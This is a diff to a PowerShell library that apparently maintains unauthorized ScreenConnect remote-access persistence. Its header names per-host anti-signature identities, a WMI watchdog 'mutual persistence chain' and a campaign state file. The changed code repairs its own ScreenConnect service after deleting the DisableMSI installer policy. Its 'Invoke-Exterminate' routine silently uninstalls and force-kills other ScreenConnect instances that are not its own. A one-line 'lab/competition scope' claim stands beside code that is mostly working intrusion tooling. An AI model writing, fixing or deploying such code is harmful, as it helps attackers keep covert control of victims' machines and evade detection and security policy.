@@ -1,12 +1,13 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L7
+# OWN_LIB  BUILD 20260802L8
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L7: FIXED WOW6432Node uninstall hive path (was missing Microsoft\Windows -
-#     every 32-bit SC product was invisible to repair/exterminate);
-#     hardened Invoke-Exterminate (enumerate both hives, msiexec+UninstallString,
-#     force dir nuke via cmd rmdir, write result to stdout+log).
+# L8: Test-SCRegistered fixed (ForEach-Object return never left function);
+#     DisplayName -ieq exact match; repair GUID walk uses foreach;
+#     SC research: per-FP UpgradeCode + legacy family Upgrade rows mean
+#     msiexec /i of primary can remove siblings - prefer /fa always.
+# L7: FIXED WOW6432Node uninstall hive path; hardened Invoke-Exterminate.
 # Authorized internal deployment - lab/competition scope only.
 # ═══════════════════════════════════════════════════════════════
 [CmdletBinding()]
@@ -146,12 +147,16 @@ $script:UninstallRoots = @(
 )
 
 function Test-SCRegistered([string]$Fingerprint) {
+    # L8: NEVER use return inside ForEach-Object - it only exits the
+    # pipeline iteration, so this function always fell through to 'no'
+    # and the mon orphan-ladder deleted healthy registered services.
     if (-not $Fingerprint) { return 'no' }
     $name = "ScreenConnect Client ($Fingerprint)"
     foreach ($root in $script:UninstallRoots) {
-        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
-            $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
-            if ($dn -and $dn -like "*$name*" -and $_.PSChildName -like '{*}') { return 'yes' }
+        if (-not (Test-Path $root)) { continue }
+        foreach ($key in (Get-ChildItem $root -ErrorAction SilentlyContinue)) {
+            $dn = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
+            if ($dn -and ($dn -ieq $name) -and ($key.PSChildName -like '{*}')) { return 'yes' }
         }
     }
     return 'no'
@@ -169,10 +174,12 @@ function Repair-SCService([string]$Fingerprint) {
     if ($svc -and $svc.Status -eq 'Running') { return 'svc-running' }
     $guid = $null
     foreach ($root in $script:UninstallRoots) {
-        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
-            $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
-            if ($dn -and $dn -like "*$name*" -and $_.PSChildName -like '{*}') { $guid = $_.PSChildName }
+        if (-not (Test-Path $root)) { continue }
+        foreach ($key in (Get-ChildItem $root -ErrorAction SilentlyContinue)) {
+            $dn = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
+            if ($dn -and ($dn -ieq $name) -and ($key.PSChildName -like '{*}')) { $guid = $key.PSChildName; break }
         }
+        if ($guid) { break }
     }
     if (-not $guid) { return 'not-registered' }
     & reg.exe delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /f 2>&1 | Out-Null
@@ -244,11 +251,12 @@ function Invoke-Exterminate {
                     if ($args -notmatch '/qn') { $args = "$args /qn /norestart" }
                     $p = Start-Process msiexec.exe -ArgumentList $args -Wait -PassThru -WindowStyle Hidden
                     Log "product_uninstallstring_msi [$dn] exit=$($p.ExitCode)"
+                    return ($p.ExitCode -in 0, 1605, 1614, 3010)
                 } else {
                     $p = Start-Process cmd.exe -ArgumentList "/c $us /S /silent /quiet /qn" -Wait -PassThru -WindowStyle Hidden
                     Log "product_uninstallstring_exe [$dn] exit=$($p.ExitCode)"
+                    return ($p.ExitCode -eq 0)
                 }
-                return $true
             } catch { Log "product_uninstallstring_FAIL [$dn] $_" }
         }
         return $false
@@ -283,12 +291,14 @@ function Invoke-Exterminate {
         $n.svc++; Log "svc_deleted $($svc.Name)"
     }
 
-    # 3. foreign SC processes
+    # 3. foreign SC processes (kill even when ExecutablePath is null)
     Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
         $exe = $_.ExecutablePath
-        if ($exe -and -not (Is-Keeper $exe)) {
+        $cmd = $_.CommandLine
+        $keeper = (Is-Keeper $exe) -or (Is-Keeper $cmd)
+        if (-not $keeper) {
             Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
-            $n.proc++; Log "proc_killed $exe"
+            $n.proc++; Log "proc_killed pid=$($_.ProcessId) exe=$exe"
         }
     }
 
